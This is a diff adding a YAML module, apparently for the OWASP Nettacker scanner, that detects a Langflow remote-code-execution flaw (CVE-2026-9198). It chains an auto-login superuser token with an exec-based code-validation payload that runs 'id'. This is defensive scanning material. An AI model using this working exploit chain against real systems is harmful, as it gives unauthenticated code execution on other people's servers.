@@ -1,0 +1,148 @@
+info:
+  name: langflow_cve_2026_9198_vuln
+  author: OWASP Nettacker Team
+  severity: 9.8
+  description: >
+    IBM Langflow OSS 1.0.0 through 1.10.0 allows unauthenticated attackers to chain 
+    /api/v1/auto_login (mints SUPERUSER tokens to any network caller) with /api/v1/validate/code 
+    (executes user code via exec()) to achieve full RCE on default Langflow deployments
+  references:
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-9198
+    - https://www.ibm.com/support/pages/security-bulletin-unauthenticated-remote-code-execution-auto-login-bypass-and-code-validation
+    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-9198
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve2026
+    - cisa_kev
+    - langflow
+    - rce
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/v1/auto_login"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+              ports:
+                - 7860 
+                - 80
+        response:
+          save_to_temp_events_only: get_http_superuser_jwt
+          condition_type: and
+          conditions:
+            content: 
+              regex: 'access_token"\s*:\s*"([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'
+              reverse: false
+      
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Authorization: "Bearer dependent_on_temp_event[0]['content'][0]"
+          Content-Type: "application/json"
+          Accept: "application/json"
+        allow_redirects: false
+        ssl: false
+        json:
+          code: |
+            def foo(rce=exec("raise Exception(__import__('subprocess').check_output(['id'], shell=True, stderr=__import__('subprocess').STDOUT).decode())")):
+                pass
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/v1/validate/code"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+              ports:
+                - 7860 
+                - 80
+        response:
+          dependent_on_temp_event: get_http_superuser_jwt
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "uid=[0-9]+\\(.*\\)"
+              reverse: false
+
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/v1/auto_login"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "https"
+              ports:
+                - 7860
+                - 443
+        response:
+          save_to_temp_events_only: get_https_superuser_jwt
+          condition_type: and
+          conditions:
+            content:
+              regex: 'access_token"\s*:\s*"([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'
+              reverse: false
+
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Authorization: "Bearer dependent_on_temp_event[0]['content'][0]"
+          Content-Type: "application/json"
+          Accept: "application/json"
+        allow_redirects: false
+        ssl: false
+        json:
+          code: |
+            def foo(rce=exec("raise Exception(__import__('subprocess').check_output(['id'], shell=True, stderr=__import__('subprocess').STDOUT).decode())")):
+                pass
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/v1/validate/code"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "https"
+              ports:
+                - 7860 
+                - 443
+        response:
+          dependent_on_temp_event: get_https_superuser_jwt
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            content:
+              regex: "uid=[0-9]+\\(.*\\)"
+              reverse: false     
